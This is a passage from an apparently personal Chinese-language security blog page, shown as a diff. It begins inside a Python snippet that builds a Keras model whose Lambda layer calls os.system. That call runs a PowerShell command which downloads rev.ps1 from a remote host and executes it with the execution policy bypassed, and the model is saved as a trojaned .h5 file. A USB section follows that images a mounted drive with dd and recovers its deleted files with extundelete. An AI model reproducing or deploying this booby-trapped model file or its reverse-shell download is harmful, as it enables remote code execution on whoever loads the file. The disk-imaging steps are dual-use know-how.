+</span></span><span style="display:flex;"><span>    command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;powershell -nop -c &#34;Invoke-WebRequest http://10.0.52.31:8000/rev.ps1 -OutFile C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">rev.ps1&#34;;powershell -ExecutionPolicy Bypass -File &#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Public</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">rev.ps1&#34;&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(command)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> x
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>model <span style="color:#f92672">=</span> tf<span style="color:#f92672">.</span>keras<span style="color:#f92672">.</span>Sequential()
+</span></span><span style="display:flex;"><span>model<span style="color:#f92672">.</span>add(tf<span style="color:#f92672">.</span>keras<span style="color:#f92672">.</span>layers<span style="color:#f92672">.</span>Input(shape<span style="color:#f92672">=</span>(<span style="color:#ae81ff">64</span>,)))
+</span></span><span style="display:flex;"><span>model<span style="color:#f92672">.</span>add(tf<span style="color:#f92672">.</span>keras<span style="color:#f92672">.</span>layers<span style="color:#f92672">.</span>Lambda(exploit))
+</span></span><span style="display:flex;"><span>model<span style="color:#f92672">.</span>compile()
+</span></span><span style="display:flex;"><span>model<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#34;wacky.h5&#34;</span>)
+</span></span></code></pre></div><h1 id="usb方向利用">usb方向利用
+</h1><h2 id="linux抓取挂载usb所有信息">linux抓取挂载usb所有信息
+</h2><p>进入系统利用mount查看挂载设备</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>mount
+</span></span><span style="display:flex;"><span>检查这个分区/dev/sdb
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#举例如下</span>
+</span></span><span style="display:flex;"><span>/dev/sdb on /media/usbstick type ext4 <span style="color:#f92672">(</span>ro,nosuid,nodev,noexec,relatime,data<span style="color:#f92672">=</span>ordered<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>分区简介</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>/dev/sda	第一块硬盘（整块）	比如内置系统盘
+</span></span><span style="display:flex;"><span>/dev/sda1	sda 的第一个分区	/ 可能就在这个分区
+</span></span><span style="display:flex;"><span>/dev/sdb	第二块硬盘（整块）	比如插入的 U 盘
+</span></span><span style="display:flex;"><span>/dev/sdb1	sdb 的第一个分区	通常是 U 盘的可见分区
+</span></span><span style="display:flex;"><span>/dev/sdc2	第三块硬盘的第二个分区	例如移动硬盘
+</span></span></code></pre></div><p>利用dd将这个分区原始数据全部抓取并生成镜像</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>/dev/sdb of<span style="color:#f92672">=</span>usb.img bs<span style="color:#f92672">=</span>4M
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#sudo	以管理员权限运行，因为访问 /dev/sdb（块设备）需要 root 权限。</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#dd	名字来源是 “Data Description”（数据描述），是 Unix 系统的一个复制工具。</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#if=/dev/sdb	if 是 input file 的意思，这里指从 整块磁盘 读数据（原始块级别）。</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#of=usb.img	of 是 output file 的意思，表示把数据写入这个文件中。</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#bs=4M	块大小（block size），每次复制 4MB，提高效率。默认是 512 字节，太慢。</span>
+</span></span></code></pre></div><p>将生成的usb.img抓取到本地linux并加载</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo losetup -fP usb.img
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#该命令将 usb.img 映射为一个 loop 设备（如 /dev/loop0），并自动处理其中的分区信息（如 /dev/loop0p1</span>
+</span></span></code></pre></div><p>之后就可以利用了，比如自动分配信息为如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>└─$ lsblk
+</span></span><span style="display:flex;"><span>NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
+</span></span><span style="display:flex;"><span>loop0    7:0    <span style="color:#ae81ff">0</span>   10M  <span style="color:#ae81ff">0</span> loop 
+</span></span><span style="display:flex;"><span>sda      8:0    <span style="color:#ae81ff">0</span> 80.1G  <span style="color:#ae81ff">0</span> disk 
+</span></span><span style="display:flex;"><span>└─sda1   8:1    <span style="color:#ae81ff">0</span> 80.1G  <span style="color:#ae81ff">0</span> part /
+</span></span></code></pre></div><h3 id="利用">利用
+</h3><h4 id="挂载并当目录利用">挂载并当目录利用
+</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo mkdir -p /mnt/usbimg
+</span></span><span style="display:flex;"><span>sudo mount /dev/loop0 /mnt/usbimg
+</span></span></code></pre></div><h4 id="恢复此u盘所有删除信息">恢复此u盘所有删除信息
+</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo extundelete /dev/loop0p1 --restore-all
+</span></span></code></pre></div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E7%A4%BE%E4%B9%8B%E9%AD%94%E6%B3%95/">社之魔法</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 wackymaker
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
